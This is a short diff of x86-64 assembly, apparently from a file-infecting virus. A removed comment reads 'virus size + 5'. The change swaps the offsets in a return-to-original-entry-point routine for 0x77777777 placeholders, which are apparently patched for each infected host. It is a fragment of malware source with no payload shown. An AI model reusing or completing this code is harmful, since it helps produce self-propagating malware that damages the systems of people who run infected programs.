@@ -39,8 +39,7 @@ _start:
 
 .ret2oep:
     call .get_rip
-    sub rax, 0x36 ;virus size + 5
-    sub rax, 0x11bd
-    add rax, 0x1050
-    ;mov rsp, r14
+    sub rax, 0x77
+    sub rax, 0x77777777
+    add rax, 0x77777777
     jmp rax
